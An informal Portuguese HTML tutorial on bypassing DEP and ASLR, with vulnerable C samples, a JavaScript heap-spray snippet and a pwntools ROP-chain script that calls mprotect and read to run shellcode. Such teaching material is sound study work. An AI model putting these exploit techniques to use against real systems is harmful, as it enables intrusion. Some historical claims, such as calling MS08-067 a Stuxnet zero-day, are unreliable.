
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <style>
        body{
            background-color: black;
        }
        a{
            text-decoration: node;
            color: red;
            text-decoration-line: none;
            text-decoration-color: none;
        }
        a:hover{
            text-decoration: node;
            color: red;
            text-decoration-line: none;
            text-decoration-color: none;
        }
        .code-container {
            background-color: black;
            border: 1px solid green;
            padding: 10px;
            overflow-x: auto;
            max-width: 600px;
            max-height: 400px;
        }
        code {
            display: block;
            white-space: pre;
        }
    </style>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypassing DEP e ASLR</title>
</head>
<body>
<pre style="color: white"><a style="color: rgb(11, 253, 3)">

            .-""-.
           / .--. \
          / /    \ \
          | |    | |
          | |.-""-.|
         ///`.::::.`\       
        ||| ::/DEP \:;                        ,o. 
        ||; ::\ASLR/:;  d8o8a.Binary.Exploit.d   b 
         \\\ '::::' /    8 8                  `o'  
           `=':-..-'`    
		</a>                                

Bypassing DEP e ASLR 

<a style="color:blue">[1]</a> Resumo
<a style="color:blue">[2]</a> Bypass do DEP
<a style="color:blue">[3]</a> bypass ASLR
<a style="color:blue">[4]</a> Ferramentas e Frameworks que podem ser usados
<a style="color:blue">[5]</a> Exemplos de ataques reais que utilizaram estes bypass

<a style="color:rgb(0, 196, 163)">1</a>. Resumo:
Este paper vai falar sobre tecnicas de como dar bypass para burlar as proteções de segurança DEP (Data execution Prevention) e ASLR (Adress Space Layout Randomization) 
em sistemas do Windola. DEP ira impedir a execução de codigo em regiões de memorias que não são designadas para ser executaveis e o ASLR randomiza os endereços da memoria 
so pra dar uma dificultada a previsão dos ataques. "nossa como assim??? não entendi nada" Calma la meu querido gafanhoto, vou explicar melhor para o leigo que você é...

Vamos la, imagine que o DEP é como se fosse um segurança durão que bate em geral que tentar entrar em sua casa(teu sistema ai) caso eles nao sejam convidados,
ele basicamente vai impedir execuções de codigos maliciosos em partes que não era pra executar o codiguinho que vai matar teu pc ou vazar todas tuas info.

Agora o ASLR é basicamente o seguinte, imagine que você é um esquisito que todo dia muda os moveis da tua casa pra os ladrões não saberem onde esta tudo, 
ele vai randomizar os endereços de memoria pra ser mais dificil dos h4ck3rs saberem onde encontrar as vulnerabilidades.     


<a style="color:rgb(0, 196, 163)">2</a>. Técnicas de Bypass de DEP
2.1. Return-Oriented Programming (ROP) (Programação Orientada a Retorno)
A ROP vai envolver uma construção de uma sequencia de instruções de pedaços de codigos existentes, a gente chama isso ai de "gadgets", normalmente 
encontradas em bibliotecas ou modulos chein de memoria. Esses gadgets ai são encadeados pra executar codigo arbitrario  sem chamar a atenção do segurança, o DEP.

"Em segurança de computadores , 'execução arbitrária de código' 
é usado para descrever a capacidade de um invasor execute qualquer comando de escolha do atacante em uma máquina de destino ou num processo de destino."

UMA COISA VOCÊ TEM QUE ENTENDER COM ROP.
Não existe apenas UMA forma de explorar o ROP. Existe varios "divergentes", não confunda, nao ha varios tipos de ROP, mas varias formas de explorar. 
dito isso, vou falar de algumas formas de explorar. 

* Sendo a mais comum, com estouro de buffer(Buffer Overflow)
<div class="code-container">
<div class="code">
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

void vuln(char *bar)
{
   char c[12]; // tamanho fixo
   strcpy(c, bar);  // estouro de buffer aqui
}

int main(int argc, char **argv)
{
   vuln(argv[1]);
   return 0;
}
</div></div>
nesse mini codigo ele tem uma função chamada "vuln" que copia um arg para um buffer local, mas como você pode ver no
comentario "tamanho fixo", ele tem um tamanho MAXIMO de 12 bytes, ou seja, se passar disso vai dar um buffer overflow.

<a style="color: red">[rsha@rsha-desktop]</a> ./buffer aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
*** stack smashing detected ***: terminated
[4]    57293 IOT instruction (core dumped)  ./buffer aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

O que é este stack smashing detected?
* "Stack Smashing here is actually caused due to a protection mechanism used by gcc to detect buffer overflow errors."



* Corrupção de ponteiros(Pointer Corruption) Ao inves de um buffer overflow ele pode explorar vulnerabilidades para corromper ponteiros, 
como por exemplo ponteiros de função so pra redirecionar o fluxo de execução.
<div class="code-container">
<div class="code">
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
    int *ptr = malloc(sizeof(int));
    *ptr = 10;
    free(ptr); // ptr agora é um ponteiro pendente
    *ptr = 20; // comportamento indefinido
    return 0;
}
</div></div>
Neste outro codigo ele aloca uma memoria pra o ponteiro ptr usando a função malloc e depois dá o valor 10, depois disso ela é liberada usando 
a função free deixando o ponteiro ptr pendente, mas ainda sim o codigo tenta acessar esse mesmo ponteiro e atribui um valor de 20 para ele, 
resultando em um comportamento indefinido.




* Liberação Controlada(Controlled Release) Aqui o atacante pode explorar falhas de liberação de memoria.

<div class="code-container">
<div class="code">
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main()
{
    char *ptr = malloc(100);
    strcpy(ptr, "dados confidenciais");
    free(ptr); // liberação incorreta de memória contendo dados confidenciais
    return 0;
}
</div></div>
mesma coisa dos outros codigos alocando memoria na variavel ptr, mas este usa a função malloc e copia a string "dados confidenciais" 
para o ptr usando a função strcpy, apos isso a memoria é liberada usando o free, o que é beeem errado e pode fazer o invasor catar seus "dados confidenciais". 
o que você tem que fazer antes de liberar é sobreescrever a memoria com zeros e depois disso liberar elas.



* Return-to-Libc: Em sistemas que usam o DEP (como eu ja expliquei a cima o que é) em que algumas areas sao impedidas de executar os codigos, vem o Return-to-libc, 
ao inves de apenas rodar o codigo no maior fodase ele chama funções da biblioteca C (libc) ao inves de injetar o codigo diretamente.

Extremamente parecido com o de bufferOverflow, não vou colocar o codigo aqui porque ele é identico, mas a forma que explora é completamente diferente.
O invasor vai basicamente explorar alguma vulnerabilidade como por exemplo a de bufferOverflow para reescrever o endereço de retorno onde esta armazenado 
na pilha com o endereço da função C. e com isso executar os comandos arbitrarios no alvo. ele por exemplo pode explorar o /bin/sh pra ter um acesso shell.

* JIT Spraying: Em browsers que executam javascript o hacker pode executar o JIT para preencher a memoria com codigos para infectar a maquina alvo. 
<div class="code-container">
<div class="code">
var shellcode = unescape("%u4343%u4343%u4343%u4343%u4343%u4343%u4343%u4343");
var spray = new Array();
for (i=0; i&lt;1000; i++)
    spray[i] = shellcode + unescape("%u0a0a%u0a0a");
</div></div>
Bom, saindo um pouco do C e indo para o JS, este codigo vai encher sua memoria com codigos especificos e vai esperar o compilador JIT compilar isso,
este codigo em especifico nao ira fazer nada de ruim ja que não é um codigo malicioso, mas em uma situação real ele pode baixar algum malware, desativar o antivirus e etc.




* ROP Chain: Aqui os gadgets podem ser desencadeados em uma certa sequencia bem especifica criando essa corrente de ROP(ROP Chain) que vai executar varias ações h4ck3rs.
<div class="code-container" style="max-width: 900px; max-height: 1000px;">
<div class="code">
from pwn import *

# Endereço dos gadgets
pop_rdi = p64(0x0000000000400686) # pop rdi; ret;
pop_rsi_r15 = p64(0x0000000000400684) # pop rsi; pop r15; ret;
pop_rdx = p64(0x0000000000437a85) # pop rdx; ret;

# Endereço das funções
mprotect = p64(0x7ffff7b00ab0)
read = p64(0x7ffff7af80a0)

# Endereço da área de memória a ser usada
buffer = p64(0x00601000)

# Tamanho da área de memória
size = p64(0x1000)

# Permissões de memória (PROT_READ | PROT_WRITE | PROT_EXEC)
permissions = p64(0x7)

# Descritor de arquivo (stdin)
fd = p64(0x0)

# Tamanho do shellcode
shellcode_size = p64(0x400)

# Construção da ROP chain
rop_chain = pop_rdi + buffer + pop_rsi_r15 + size + p64(0x0) + pop_rdx + permissions + mprotect
rop_chain += pop_rdi + fd + pop_rsi_r15 + buffer + p64(0x0) + pop_rdx + shellcode_size + read

# Envia a ROP chain para o processo alvo
p = process('./vulnerable_program')
p.sendline('A' * 40 + rop_chain)
p.interactive()
</div></div>
esse script simples, mas o maior que teve aqui nesse paper tem como objetivo desativar as proteções de segurança do sistema,
ele vai ler o codigo do stdin e vai o executar. A ROP chain usa varios gadgets para controlar uns valores dos registradores 
e vai chamar as funções mprotect e read pra alterar as permissões de memoria e ler o codigo.


<a style="color:rgb(0, 196, 163)">3</a>. Técnicas de Bypass de ASLR

3.1 Infoleaks(vazamento de informações)
InfoLeaks vai explorar vulnerabilidades de informações para revelar endereços de memorias aleatorias, dai com isso eles podem vazar ponteiros bem sensiveis, 
como ponteiros para funções ou estruturas de dados. se você quiser saber mais sobre memoria recomendo estudar sobre cheat de jogo.

3.2 BruteForce
A tecnica de BruteForce é relativamente parecida com a de serviços comuns, como um bruteforce de ssh, ftp e etc etc, o bruteforce para bypass de ASLR vai tentar advinhar 
o endereço de uma função ou area da memoria com tentativa e erros, como um bruteforce mesmo. Mas toda via no entanto, ela não é muito viavel se o espaço do endereçamento 
for muito grande, ou então se tiver alguma forma de ver se o endereço é o certo ou não. 


<a style="color:rgb(0, 196, 163)">4</a>. Ferramentas e Frameworks que podem ser usados

4.1 ROPGadgets
Uma ferramenta boa para encontrar gadgets ROP em binarios, é bem util pra criar exploits que usam a tecnica de ROP

4.2 GDB(GNU Debugger) ou GDB-peda
Usado pra debugar em sistema unix e suporta varias langs de programação, como C, C++, fortran(eca), pascal e por ai vai. Utilizei ele pra dar debug no bufferoverflow do ROP. 
(obrigado ninja pela recomendação :&gt; &lt;3)

4.3 Pwntools
Oficialmente criado para CTF(Capture The Flag) e desenvolvimento de exploits, feito em python e com o objetivo de criar exploits da maneira mais facil possivel.
<div class="code-container">
<div class="code">
==&gt; Conexão remota &lt;==
&gt;&gt;&gt; conn = remote('ftp.ubuntu.com',21)
&gt;&gt;&gt; conn.recvline() 
b'220 ...'
&gt;&gt;&gt; conn.send(b'USER anonymous\r\n')
&gt;&gt;&gt; conn.recvuntil(b' ', drop=True)
b'331'
&gt;&gt;&gt; conn.recvline()
b'Please specify the password.\r\n'
&gt;&gt;&gt; conn.close()
</div></div><div class="code-container"><div class="code">
==&gt; Criando um listener &lt;==
&gt;&gt;&gt; l = listen()
&gt;&gt;&gt; r = remote('localhost', l.lport)
&gt;&gt;&gt; c = l.wait_for_connection()
&gt;&gt;&gt; r.send(b'hello')
&gt;&gt;&gt; c.recv()
b'hello'
</div></div><div class="code-container"><div class="code">
==&gt; Interagindo com processos &lt;==
&gt;&gt;&gt; sh = process('/bin/sh')
&gt;&gt;&gt; sh.sendline(b'sleep 3; echo hello world;')
&gt;&gt;&gt; sh.recvline(timeout=1)
b''
&gt;&gt;&gt; sh.recvline(timeout=5)
b'hello world\n'
&gt;&gt;&gt; sh.close()
</div></div>
Dei apenas 3 exemplos de o que o framework é capaz, mas é realmente bem interessante dar uma olhada nele depois,
talvez tu goste(ou talvez nao) e pare de usar o proprio socket do python. 
- docs.pwntools.com

<a style="color:rgb(0, 196, 163)">5</a>. Exemplos de ataques reais que utilizaram estes bypass.

5.1 Stuxnet (2010)
Worm bem avançado pra epoca que pegou sistema de instações NUCLEARES do irã. Foi a primeira "arma" cibernetica do mundo que impactou 
alguma estrutura fisica, ele conseguiu atacar centrifugas que danificou e destruiu varios recursos militares. Este worm utilizou uma
vulnerabilidade 0day chamada de "MS08-067", nome chato mas é esse ai, nao quiseram dar um nome bonitinho nype eternalblue. 
"Vulnerabilidade no serviço Servidor pode permitir execução remota de código"
E aparentemente conseguiram decompilar o codigo, se quiser dar uma lida no codigo para ver como eles fizeram, tem no github bem aqui.
https://github.com/micrictor/stuxnet (criado em C e C++)

5.2 Duqu (2011)
Um ano depois lançaram essa aqui, ele tem algumas semelhanças com o stuxnet tipo a origem relacionada, alvos e interesses e especificos e por ai vai. 
Ele foi criado para espionagem e para coletar informações em uns sistemas especificos.

</pre></body></html>